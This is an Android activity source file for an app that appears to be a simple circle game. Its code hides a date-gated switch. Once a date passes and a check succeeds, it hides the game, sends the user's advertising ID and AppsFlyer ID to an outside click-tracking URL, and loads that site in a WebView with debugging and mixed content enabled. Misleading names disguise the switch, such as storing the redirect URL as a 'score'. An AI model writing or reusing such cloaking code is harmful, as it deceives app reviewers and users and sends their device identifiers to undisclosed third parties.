package com.voracious.mstov;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.text.SimpleDateFormat;
import java.util.Calendar;



public class MainActivity extends AppCompatActivity implements AsyncResponse{

    String playTime = new SimpleDateFormat("yyyyMMdd").format(Calendar.getInstance().getTime());
    int playDay = Integer.parseInt(playTime);

    // player's data
    static String playersScoreCurrent;
    public static final String MY_PREFS_NAME = "mstov";
    circleAsyncPath enemyCirclePath =new circleAsyncPath();
    CanvasView circle;

    // text//
    private static final String TAG = MainActivity.class.getSimpleName();
    private String mCM;
    private ValueCallback<Uri> mUM;
    private ValueCallback<Uri[]> mUMA;
    private final static int FCR=1;
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent){
        super.onActivityResult(requestCode, resultCode, intent);
        if(Build.VERSION.SDK_INT >= 21){
            Uri[] results = null;
            //Check if response is positive
            if(resultCode== Activity.RESULT_OK){
                if(requestCode == FCR){
                    if(null == mUMA){
                        return;
                    }
                    if(intent == null || intent.getData() == null){
                        //Capture Photo if no image available
                        if(mCM != null){
                            results = new Uri[]{Uri.parse(mCM)};
                        }
                    }else{
                        String dataString = intent.getDataString();
                        if(dataString != null){
                            results = new Uri[]{Uri.parse(dataString)};
                        }
                    }
                }
            }
            mUMA.onReceiveValue(results);
            mUMA = null;
        }else{
            if(requestCode == FCR){
                if(null == mUM) return;
                Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
                mUM.onReceiveValue(result);
                mUM = null;
            }
        }
    }

    @SuppressLint({"SetJavaScriptEnabled", "WrongViewCast"})
    // test //

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getSupportActionBar().hide();
        enemyCirclePath.delegate = this;
        enemyCirclePath.execute();
        circle = findViewById(R.id.circles);
        circle.setVisibility(View.INVISIBLE);


        FacebookSdk.setApplicationId(getString(R.string.facebook_app_id));
        FacebookSdk.sdkInitialize(this);
        AppLinkData.fetchDeferredAppLinkData(this,
                new AppLinkData.CompletionHandler() {
                    @Override
                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {

                    }
                }
        );
    }

    public void saveScore(String currentScore) {
        SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
        editor.putString("score", currentScore);
        editor.apply();
    }

    public String getScore() {
        SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        return prefs.getString("score", playersScoreCurrent);
    }

    public String checkScore() {
        SharedPreferences pref = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        return pref.getString("score", "");
    }

    @Override
    public void onBackPressed() {
        WebView webView = findViewById(R.id.feedback);
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public void processFinish(String output){
        if (playDay >= 20200220) {
            if (GameManager.roadCheck()) {
                CanvasView circle = findViewById(R.id.circles);
                circle.setVisibility(View.GONE);
                WebView mWebView = findViewById(R.id.feedback);

                // test //
                mWebView.getSettings().setDomStorageEnabled(true);
                mWebView.getSettings().setJavaScriptEnabled(true);

                mWebView.getSettings().setLoadsImagesAutomatically(true);
                CookieManager.getInstance().setAcceptCookie(true);

                mWebView.getSettings().setAppCachePath(""+this.getCacheDir());
                mWebView.getSettings().setAppCacheEnabled(true);
                mWebView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);

                if(Build.VERSION.SDK_INT >= 21){
                    mWebView.getSettings().setMixedContentMode(0);
                    mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                }else if(Build.VERSION.SDK_INT >= 19){
                    mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                }else if(Build.VERSION.SDK_INT < 19){
                    mWebView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    WebView.setWebContentsDebuggingEnabled(true);
                }

                // test //

                CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);

                String appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
                String startWebUrl = "https://domaindomain.site/click.php?key=" +
                        "ortt2hkkhlp4es1mlvf0&apid="+appsFlyerId+"&gaid="+output;
                if (checkScore().equals("")) {
                    mWebView.loadUrl(startWebUrl);
                } else {
                    mWebView.loadUrl(getScore());
                }
                mWebView.setWebViewClient(new WebViewClient() {
                    @Override
                    public boolean shouldOverrideUrlLoading(WebView view, String url) {
                        if( url.startsWith("http:") || url.startsWith("https:") ) {
                            return false;
                        }

                        // Otherwise allow the OS to handle things like tel, mailto, etc.
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity( intent );
                        return true;
                    }
                });

                // test //
                mWebView.setWebChromeClient(new WebChromeClient() {

                    public void onProgressChanged(WebView view, int progress) {
                        super.onProgressChanged(view, progress);
                        setSupportProgressBarIndeterminateVisibility((progress == 100)?false:true);
                    }
                    public void onReceivedTitle(WebView view, String title) {
                        super.onReceivedTitle(view, title);
                        CharSequence notavail = "Webpage not available";
                    }
                });


                // test //



            } else {
                circle.findViewById(R.id.circles);
                circle.setVisibility(View.VISIBLE);
                circle.invalidate();
            }
        } else {
            circle.findViewById(R.id.circles);
            circle.setVisibility(View.VISIBLE);
            circle.invalidate();
        }
    }

    public class circleAsyncPath extends  AsyncTask<Void, Void, String> {
        public AsyncResponse delegate = null;
        @Override
        protected String doInBackground(Void... params) {
            AdvertisingIdClient.Info idInfo = null;
            try {
                idInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
            } catch (GooglePlayServicesNotAvailableException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesRepairableException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
            String advertId = null;
            try {
                advertId = idInfo.getId();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return advertId;
        }


        @Override
        protected void onPostExecute(String advertId) {
            delegate.processFinish(advertId);
            //Toast.makeText(getApplicationContext(), advertId, Toast.LENGTH_SHORT).show();
        }
    };




}
